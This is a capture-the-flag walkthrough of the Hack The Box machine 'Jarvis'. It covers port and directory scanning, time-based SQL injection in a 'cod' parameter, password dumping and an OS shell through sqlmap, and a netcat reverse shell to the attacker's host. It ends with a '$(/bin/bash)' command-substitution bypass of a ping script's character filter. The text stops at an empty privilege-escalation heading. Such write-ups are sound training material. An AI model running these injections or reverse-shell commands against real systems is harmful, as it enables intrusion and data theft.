# Hack The Box - Jarvis Walkthrough 

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Jarvis]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.143
[sudo] password for darshan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-09 08:31 EST
Nmap scan report for 10.10.10.143
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03f34e22363e3b813079ed4967651667 (RSA)
|   256 25d808a84d6de8d2f8434a2c20c85af6 (ECDSA)
|_  256 77d4ae1fb0be151ff8cdc8153ac369e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=3/9%OT=22%CT=1%CU=42545%PV=Y%DS=2%DC=I%G=Y%TM=6409DFBA
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=8)SEQ(
OS:SP=107%GCD=1%ISR=105%TI=Z%CI=Z%TS=8)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3
OS:=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=7120%W2=7
OS:120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.77 seconds

```
Before starting the enumeration, I wanted to check if any other ports were open, so I ran rustscan to quickly check if any other ports were open.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Jarvis]
└─$ rustscan -a 10.10.10.143 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.143:22
Open 10.10.10.143:80
Open 10.10.10.143:64999
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80,64999 10.10.10.143

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-09 08:32 EST
Initiating Ping Scan at 08:32
Scanning 10.10.10.143 [2 ports]
Completed Ping Scan at 08:32, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:32
Completed Parallel DNS resolution of 1 host. at 08:32, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 08:32
Scanning 10.10.10.143 [3 ports]
Discovered open port 22/tcp on 10.10.10.143
Discovered open port 80/tcp on 10.10.10.143
Discovered open port 64999/tcp on 10.10.10.143
Completed Connect Scan at 08:32, 0.12s elapsed (3 total ports)
Nmap scan report for 10.10.10.143
Host is up, received syn-ack (0.12s latency).
Scanned at 2023-03-09 08:32:43 EST for 0s

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
64999/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds
```

Rustscan found 3 open ports while Nmap found 2 open ports, so I ran a full ports nmap scan to scan all the 65535 ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Jarvis]
└─$ sudo nmap -sC -sV -O -p- -oA nmap/initial 10.10.10.143
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-09 08:38 EST
Nmap scan report for 10.10.10.143
Host is up (0.12s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03f34e22363e3b813079ed4967651667 (RSA)
|   256 25d808a84d6de8d2f8434a2c20c85af6 (ECDSA)
|_  256 77d4ae1fb0be151ff8cdc8153ac369e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=3/9%OT=22%CT=1%CU=30817%PV=Y%DS=2%DC=I%G=Y%TM=6409E350
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=2%ISR=10B%TI=Z%CI=Z%II=I%TS=8)OPS(
OS:O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11
OS:NW7%O6=M53CST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 529.19 seconds
```

So, after running Nmap and Rustscan, I found `3` open ports:
- port `22`: running `OpenSSH 7.4p1`.
- port `80`: running `Apache httpd 2.4.25`.
- port `64999`: running `Apache httpd 2.4.25`.

## Enumeration
The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that I'd be able gain initial access through this port, unless I find credentials.

So, i decided to visit port `80`.

![image](https://user-images.githubusercontent.com/87711310/224041301-4e9be272-7762-467a-8c66-68eff7aa1f2c.png)

Going throught the page, I found two domain names: `supersecurehotel.htb` & `logger.htb`.

![image](https://user-images.githubusercontent.com/87711310/224044882-0a61bf44-0a37-4bb8-b597-90d08951019c.png)

So, I added them to the `/etc/hosts` file.

```
sudo echo "10.10.10.143 supersecurehotel.htb logger.htb" >> /etc/hosts
```

Both the domain names seem to redirect to the same website. So next, I decided to look at the source code of the page to see if I could get some information. 

The source code of the page didn't reveal any information.

So, next, I decided to visit all the links in the application. Most of them seemed to be static while others were just dummy link. The `room.php` was the exception that took in the `cod` parameter and outputs the following information.

![image](https://user-images.githubusercontent.com/87711310/224049464-dd474c2c-5c78-4e5f-8b6d-99b163dfc5af.png)

So, now I tried playing around with it and say that if this parameter field is vulnerable, which it is most probably, it;s vulnerable to one of the following: `LFI`, `RFI`, or `SQLi`

Simultaneously, I ran `gobuster` to enumerate directories.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Jarvis]
└─$ gobuster dir -u http://10.10.10.143 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -o gobuter-root-scan -t 100
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.143
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/03/09 09:21:43 Starting gobuster in directory enumeration mode
===============================================================
/nav.php              (Status: 200) [Size: 1333]
/footer.php           (Status: 200) [Size: 2237]
/.php                 (Status: 403) [Size: 291]
/css                  (Status: 301) [Size: 310] [--> http://10.10.10.143/css/]
/images               (Status: 301) [Size: 313] [--> http://10.10.10.143/images/]
/index.php            (Status: 200) [Size: 23628]
/js                   (Status: 301) [Size: 309] [--> http://10.10.10.143/js/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.10.143/fonts/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.10.143/phpmyadmin/]
/room.php             (Status: 302) [Size: 3024] [--> index.php]
/connection.php       (Status: 200) [Size: 0]
/.php                 (Status: 403) [Size: 291]
/sass                 (Status: 301) [Size: 311] [--> http://10.10.10.143/sass/]
Progress: 175150 / 175330 (99.90%)
===============================================================
2023/03/09 09:25:30 Finished
===============================================================
```

So, I found `phppmyadmin` directory which was enumerated by gobuster. It had a login page.

![image](https://user-images.githubusercontent.com/87711310/224053862-83c995ed-d8d6-4c59-9436-88d77f0f2446.png)


I tried default credentials but that didn’t work.

Then, I viewed the `ChangeLog` document to get the version number of php.

![image](https://user-images.githubusercontent.com/87711310/224055577-6add7fee-52a6-49df-85cb-25b0dccc3af5.png)

The version is `4.8.0`. So, I checked on searchsploit for the version number.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Jarvis]
└─$ searchsploit phpMyAdmin | grep  4\\.8\\.
phpMyAdmin 4.8.0 < 4.8.0-1 - Cross-Site Request Forgery                   | php/webapps/44496.html
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1)               | php/webapps/44924.txt
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)               | php/webapps/44928.txt
phpMyAdmin 4.8.1 - Remote Code Execution (RCE)                            | php/webapps/50457.py
phpMyAdmin 4.8.4 - 'AllowArbitraryServer' Arbitrary File Read             | php/webapps/46041.py
```

But, all of these exploits required authentication, so I needed to find credentials first.

So, now, I decided to move on to port `64999`. The site just has a static bit of text:

![image](https://user-images.githubusercontent.com/87711310/224056727-cc15bafc-629a-4adf-93cf-62933784c803.png)

So, I decided to view the page source, couldn't find anything.

Then, I ran gobuster. I didnt get anything useful

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Jarvis]
└─$ gobuster dir -u http://10.10.10.143:64999 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -o gobuter-64999-scan -t 100
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.143:64999
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/03/09 09:35:10 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 294]
/.php                 (Status: 403) [Size: 294]
Progress: 175328 / 175330 (100.00%)
===============================================================
2023/03/09 09:39:02 Finished
===============================================================
```

So, then, I decided to take a look at the site's response header but there was nothing too.

I remember that I didnt look at the response header of port `80`. So, I even did that.

Here, I found something wierd. There was a `IronWAF` header. I googled `IronWAF`, but it returned no results for IronWAF, so it might be a custom thing for this box. 

```
HTTP/1.1 200 OK
Date: Thu, 09 Mar 2023 14:53:13 GMT
Server: Apache/2.4.25 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
IronWAF: 2.0.3
Content-Length: 23628
Connection: close
Content-Type: text/html; charset=UTF-8
```

Earlier, I took a note of `room.php` which tool  an argument `cod`. I tried couple of things on that parameter and apparently, I was able to break the page by adding `'` at the end.

![image](https://user-images.githubusercontent.com/87711310/224063710-086ce2aa-8fd3-483c-864d-217698d6f57e.png)

It didn’t crash the page or return 500, but the information and picture for the room weren’t there anymore. This suggests SQL Injection.

I knew that webpage is using a MySQL database based on the `ChangeLog` document of phpMyAdmin. The first thing I’m going to try is a simple time-based SQL injection. If it takes longer than usual for the response to come back to me, then we know it’s vulnerable.

```
http://supersecurehotel.htb/room.php?cod=1%20or%20sleep(10)
```

The application did take about 10 seconds before it returned a response, which confirms that the backend is interpreting the `sleep` command as SQL code and running it. Therefore, this is for sure vulnerable to SQL injection.

So, I decided to confirm that it's vulnerable using SQLMap. So, I intercepted the request in Burp.

![image](https://user-images.githubusercontent.com/87711310/224068340-302ea745-de4d-48c6-b747-5c8a22e792d0.png)

Copied the contents of the request and saved it in the file `request.txt`.

```
sqlmap -v 4 --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" -r request.txt
```

And, i got back the result, confirming that the `cod` parameter was vulnerbale to SQL Injection.

![image](https://user-images.githubusercontent.com/87711310/224068208-057c5b9c-d619-426f-8968-55a1f388f115.png)

SQLMap also has a flag that enumerates the DBMS users' password hashes and then attempts to crack them.

```
sqlmap -v 4 --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" --passwords -r request.txt
```

I got back the following results and SQLMap not only found the password hash but also cracked the hash.

![image](https://user-images.githubusercontent.com/87711310/224069775-1e528d17-ddfa-4ed8-b1d1-0646d9d20e8b.png)

I tried this password on `phpmyadmin` page and it worked!!

Instead of using `phpmyadmin` page get a reverse shell, I found out that `sqlmap` also has another cool feature that tries to get a shell on the host running the webserver.

```
sqlmap -v 4 --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" --os-shell -r request.txt
```

![image](https://user-images.githubusercontent.com/87711310/224072431-c9b6db9e-6378-486b-a8e6-fc1b65bca1e3.png)

And I got back a shell!! Since it wasnt a full reverse shell, I sent back a reverse shell back to my machine using netcat.

Started a netcat listener.

```
nc -lvnp 999
```

I used the following reverse shell command.

```
nc -e /bin/sh 10.10.14.47 9999
```

Ran the above command on netcat and visited the netcat listener.

```
┌──(darshan㉿kali)-[~]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.10.143] 50462
whoami
www-data
```

I got a shell. I decided to upgrade the shell.

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

I tried grabbing the user flag but I was denied permission

```
www-data@jarvis:/var/www/html$ cd /home
cd /home
www-data@jarvis:/home$ ls
ls
pepper
www-data@jarvis:/home$ cd pepper
cd pepper
www-data@jarvis:/home/pepper$ ls
ls
Web  user.txt
www-data@jarvis:/home/pepper$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```

So, I tried to run the `sudo -l` command to view the list of allowed commands the user can run using sudo without a password.

```
sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

I had the rights to run the `simpler.py` file with pepper's privileges, so I looked at the permissions on the file.

```
www-data@jarvis:/home/pepper$ ls -la /var/www/Admin-Utilities/
ls -la /var/www/Admin-Utilities/
total 16
drwxr-xr-x 2 pepper pepper 4096 Mar  4  2019 .
drwxr-xr-x 4 root   root   4096 Mar  4  2019 ..
-rwxr--r-- 1 pepper pepper 4587 Mar  4  2019 simpler.py
```

I could read the file, so I looked at the contents of the file.

```python
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import redef show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)......def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```

The `-p` option calls the `exec_ping()` command. This command takes in user provided input and checks if the following characters are part of the input: ‘&’, ‘;’, ‘-’, ‘||’, ‘|’. If it finds one of these characters, it prints out the message “Got you” and terminates the program. Otherwise, it executes the ping command on the user provided input.

One thing I noticed was that the `$ (dollar)` sign was allowed, so I could sue that to get a privilged shell.

```
www-data@jarvis:/var/www/Admin-Utilities$ ping $(whoami)ping: www-data: Temporary failure in name resolution
```

Whatever is in the parenthesis will be executed first and the output of it will be passed to the ping command. Therefore, as can be seen in the above output, it resolved the whoami command to `www-data` and then it tried to ping the output of the command.

So, to escalate my privileges to pepper, in the IP address field, I just ran the `$(/bin/bash)` command.

```
www-data@jarvis:/home/pepper$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p 
<o -u pepper /var/www/Admin-Utilities/simpler.py -p 
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(/bin/bash)
$(/bin/bash)
pepper@jarvis:~$ whoami
whoami
pepper@jarvis:~$ cat /home/pepper/user.txt
cat /home/pepper/user.txt
pepper@jarvis:~$ ls
ls
```

Clearly there was something wrong once I was escalted to pepper, so instead of messing around with the system, I sent a new reverse shell to my machine.

I received the reverse shell on my netcat listener and upgraded it to an interactive shell.

```
┌──(darshan㉿kali)-[~]
└─$ nc -lvnp 8888 
listening on [any] 8888 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.10.143] 50410
whoami
pepper
python3 -c 'import pty; pty.spawn("/bin/bash")'
pepper@jarvis:~$ ls
ls
Web  user.txt
```

Grabbing the user flag.

```
pepper@jarvis:~$ cat user.txt
[REDACTED]
```

## Privilege Escalation
